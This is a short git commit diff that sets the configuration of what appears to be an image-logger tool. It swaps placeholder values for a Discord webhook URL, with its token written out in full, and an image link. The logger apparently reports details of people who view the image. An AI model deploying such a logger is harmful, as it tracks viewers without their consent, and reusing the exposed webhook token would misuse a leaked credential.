21008824e4f161a4495833e166fa3f98f0147ecd
what157840-sketch <what157840@gmail.com>
2026-03-09 16:18:01 -0700

    Update webhook and image URL in config

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1480701919885266944/wkxgZKdK9hYlYwVY5peSe548-Fz4jt4Yv6cOAlLKbYwnWYc-7DoWxxoi3YGnmecLrFe7",
+    "image": "https://i.pinimg.com/1200x/83/2f/31/832f310fdf8f2f58e39d0214ff02a546.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
